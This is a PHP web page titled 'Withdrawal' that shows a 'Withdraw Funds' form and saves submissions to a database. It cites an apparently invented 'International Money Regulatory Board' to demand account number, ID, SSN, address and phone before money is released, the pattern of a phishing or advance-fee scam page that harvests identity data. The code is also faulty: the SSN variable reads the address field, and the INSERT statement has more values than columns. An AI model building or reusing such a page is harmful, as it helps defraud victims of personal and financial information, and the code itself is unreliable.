<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Withdrawal</title>
<link rel="stylesheet" href="css/style.css" />
</head>
<body>
<?php
require('db.php');
// If form submitted, insert values into the database.
if (isset($_REQUEST['name'])){
	$name = stripslashes($_REQUEST['name']);
	$name = mysqli_real_escape_string($con,$name); 
	$phoneno = stripslashes($_REQUEST['phoneno']);
	$phoneno = mysqli_real_escape_string($con,$phoneno);
	$address = stripslashes($_REQUEST['address']);
	$address = mysqli_real_escape_string($con,$address);
	$did = stripslashes($_REQUEST['did']);
	$did = mysqli_real_escape_string($con,$did);
	$ssn = stripslashes($_REQUEST['address']);
	$ssn = mysqli_real_escape_string($con,$ssn);
        $query = "INSERT into `users` (name, address, phoneno, did)
VALUES ('$name', '$address', '$phoneno', '$did', '$ssn')";
        $result = mysqli_query($con,$query);
        if($result){
            echo "<div class='form'>
<h3>We're processing the information and if everything checks out we would send the money to your bank account.</h3>
<br/>Click here to go back to <a href='dashboard.php'>Dashboard</a></div>";
        }
    }else{
?>
<div class="form">
<h1>Withdraw Funds</h1>
<h3>Due to recent changes by the International Money Regulatory Board (IMRB) to prevent money laundering you would be required to fill in the following information for verification.</h3>
<form name="registration" action="" method="post">
<input type="text" name="amount" placeholder="Amount To Withdraw" required />
<input type="text" name="bank" placeholder="Account Number" required />
<input type="text" name="name" placeholder="Full Name" required />
<input type="text" name="phoneno" placeholder="Phone Number" required />
<input type="text" name="address" placeholder="Home Address" required />
<input type="text" name="did" placeholder="ID" required />
<input type="text" name="ssn" placeholder="SSN" required />
<input type="submit" name="submit" value="Submit" />
</form>
</div>
<?php } ?>
</body>
</html>
